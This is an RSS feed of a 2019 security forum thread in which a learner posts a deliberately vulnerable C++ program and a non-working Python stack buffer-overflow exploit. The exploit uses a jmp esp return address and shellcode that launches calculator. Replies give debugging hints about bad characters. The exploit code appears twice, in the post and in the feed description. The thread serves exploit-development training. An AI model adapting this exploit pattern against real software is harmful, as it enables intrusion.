<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Buffer overflows</title>
    <link>https://0x00sec.org/t/buffer-overflows/18352</link>
    <description>I am in the process of writing my first ever buffer overflow exploit for training purposes but I can&#39;t seem to figure it out and my exploits only crash with out any useful output so I am asking for your help.
    
    // the compiled executable is called exec.exe
    #include &lt;iostream&gt;
    using namespace std;
    int main() 
    {
         char buff[256];
         cin &gt;&gt; buff;
         cout &lt;&lt; buff;
         return 0;
    }

this code takes a user input and writes it to the buffer allocated by the program  as far as I know, 
now I figured out the offset to be 268 that&#39;s 256 +12, using Immunity debugger I found to jmp esp addresses and tried using them as the EIP (return address in the exploit code ) 
   
    from  subprocess import *
    import struct 
    p = Popen([&#39;exec.exe&#39;],stdout=PIPE,stdin=PIPE)
    EIP = struct.pack(&quot;I&quot;, 0x6eb51e62)
    pad = b&quot;\x42&quot;*145
    shellcode = b&quot;\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7&quot;
    out_put = pad+EIP+shellcode
    p.communicate(out_put)
    


the length of the out_put is 268 
this shellcode opens a calculator  
I tried to increase the padding but was not successful</description>
    
    <lastBuildDate>Tue, 31 Dec 2019 08:32:24 +0000</lastBuildDate>
    <category>Questions</category>
    <atom:link href="https://0x00sec.org/t/buffer-overflows/18352.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Buffer overflows</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/buffer-overflows/18352/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflows/18352/4</link>
        <pubDate>Thu, 30 Apr 2020 04:31:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18352-4</guid>
        <source url="https://0x00sec.org/t/buffer-overflows/18352.rss">Buffer overflows</source>
      </item>
      <item>
        <title>Buffer overflows</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Apparently <code>cin</code> terminates on spaces which also seems to appear in your input. Make sure you check for other bad characters.</p>
<p>Never seen people starting exploit dev using C++.</p>
          <p><a href="https://0x00sec.org/t/buffer-overflows/18352/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflows/18352/3</link>
        <pubDate>Tue, 31 Dec 2019 08:32:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18352-3</guid>
        <source url="https://0x00sec.org/t/buffer-overflows/18352.rss">Buffer overflows</source>
      </item>
      <item>
        <title>Buffer overflows</title>
        <dc:creator><![CDATA[Silver_Exploit]]></dc:creator>
        <description><![CDATA[
            <p>Hello, first of all, please even is the output seems not useful share it.<br>
I recommend you to take a look at this post<br>
</p><aside class="quote quote-modified" data-post="1" data-topic="3846">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/sk0xic/40/5504_2.png" class="avatar">
    <a href="https://0x00sec.org/t/buffer-overflow-exploitation/3846">Buffer Overflow Exploitation</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/exploit-development/53"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Exploit Development</span></a>
  </div>
  <blockquote>
    Hi 0x00ers. 
This is my first post and my goal in it is to share and detail how you can exploit a buffer overflow by doing a detailed analysis of the executable and for that I will solve a challenge proposed by ricnar in its reversing course, it is clear that i just started on the subject of reversing and if I am wrong in something I ask you heartily that let me know 
Author Assigned Level: Newbie
Community Assigned Level:
<a href="https://0x00sec.org/t/buffer-overflow-exploitation/3846/1">poll</a>
Required Skills

C++ language, a basic level would be fine
x86 Intel…
  </blockquote>
</aside>
<br>
Maybe can help you, also try to use examples codes of buffer overflow before creating your own one.<p></p>
<p>Hope this helps you <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/buffer-overflows/18352/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflows/18352/2</link>
        <pubDate>Tue, 31 Dec 2019 07:02:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18352-2</guid>
        <source url="https://0x00sec.org/t/buffer-overflows/18352.rss">Buffer overflows</source>
      </item>
      <item>
        <title>Buffer overflows</title>
        <dc:creator><![CDATA[max.syntax]]></dc:creator>
        <description><![CDATA[
            <p>I am in the process of writing my first ever buffer overflow exploit for training purposes but I can’t seem to figure it out and my exploits only crash with out any useful output so I am asking for your help.</p>
<pre><code>// the compiled executable is called exec.exe
#include &lt;iostream&gt;
using namespace std;
int main() 
{
     char buff[256];
     cin &gt;&gt; buff;
     cout &lt;&lt; buff;
     return 0;
}
</code></pre>
<p>this code takes a user input and writes it to the buffer allocated by the program  as far as I know,<br>
now I figured out the offset to be 268 that’s 256 +12, using Immunity debugger I found to jmp esp addresses and tried using them as the EIP (return address in the exploit code )</p>
<pre><code>from  subprocess import *
import struct 
p = Popen(['exec.exe'],stdout=PIPE,stdin=PIPE)
EIP = struct.pack("I", 0x6eb51e62)
pad = b"\x42"*145
shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"
out_put = pad+EIP+shellcode
p.communicate(out_put)
</code></pre>
<p>the length of the out_put is 268<br>
this shellcode opens a calculator<br>
I tried to increase the padding but was not successful</p>
          <p><a href="https://0x00sec.org/t/buffer-overflows/18352/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflows/18352/1</link>
        <pubDate>Mon, 30 Dec 2019 12:31:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18352-1</guid>
        <source url="https://0x00sec.org/t/buffer-overflows/18352.rss">Buffer overflows</source>
      </item>
  </channel>
</rss>
